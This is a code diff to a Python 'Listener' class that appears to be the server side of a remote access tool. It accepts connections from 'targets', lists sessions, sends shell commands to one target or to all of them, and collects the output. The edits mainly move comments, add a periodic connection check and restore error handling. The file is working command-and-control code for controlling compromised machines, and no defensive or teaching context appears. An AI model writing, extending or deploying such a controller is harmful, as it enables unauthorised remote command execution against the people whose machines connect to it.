@@ -27,11 +27,12 @@ class Listener:
         self.addresses = manager.list()
         self.connections = manager.list()
         self.num = 0
-        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create a socket object
-        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse sockets if lost previous connection
-        self.listener.bind((self.ip, self.port))  # listen for incoming connections
-        self.listener.listen(0)  # the maximum number of connections
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.listener.bind((self.ip, self.port))
+        self.listener.listen(0)
 
+    # function that handles incoming connections
     def server(self):
         print("[+] Waiting for incoming connections..")
         while True:
@@ -47,16 +48,18 @@ class Listener:
     # function that checks for disconnected sockets !WARNING! DON'T ASK HOW IT WORKS! I DON'T KNOW EITHER! IT SHOULD
     # NOT WORK BUT IT DOES! BASED ON DOCUMENTATIONS IT MAKES ZERO SENSE! DON'T CHANGE ANYTHING OR BAD THINGS HAPPEN!
     def check_connections(self):
-        for i, connection in enumerate(self.connections):
-            ready = select.select([self.connections[i]], [], [], 0.1)
-            self.reliable_send(["PING"], i)
-            self.connections[i].recv(1024)
-            if not ready[0]:
-                pass
-            else:
-                connection.close()
-                del self.connections[i]
-                del self.addresses[i]
+        while True:
+            sleep(15)
+            for i, connection in enumerate(self.connections):
+                ready = select.select([self.connections[i]], [], [], 0.1)
+                self.reliable_send(["PING"], i)
+                self.connections[i].recv(1024)
+                if not ready[0]:
+                    pass
+                else:
+                    connection.close()
+                    del self.connections[i]
+                    del self.addresses[i]
 
     # function that sends json objects through socket connection
     def reliable_send(self, data, i):
@@ -73,9 +76,10 @@ class Listener:
             except json.decoder.JSONDecodeError:  # if didn't receive the whole package yet, wait
                 continue
 
+    # function that sends command to the target and receives the results
     def execute_remotely(self, command, i):
-        self.reliable_send(command, i)     # send the command to the target
-        return self.reliable_receive(i)  # receive the results from the executed command
+        self.reliable_send(command, i)
+        return self.reliable_receive(i)
 
     def shell(self):
         while True:
@@ -95,16 +99,15 @@ class Listener:
                 break
 
             elif command[0] == "connections":
-                self.check_connections()
                 for i, address in enumerate(self.addresses):
                     print("{}. {}".format(str(i), str(address)))
 
             elif command[0] == "session":
-                # try:
-                self.num = int(command[1])
-                self.session()
-                # except Exception:
-                #     print("[!] Connection not found.")
+                try:
+                    self.num = int(command[1])
+                    self.session()
+                except Exception:
+                    print("[!] Connection not found.")
 
             elif command[0] == "sendall":
                 json_data = json.dumps(command[1:]).encode('utf-8')
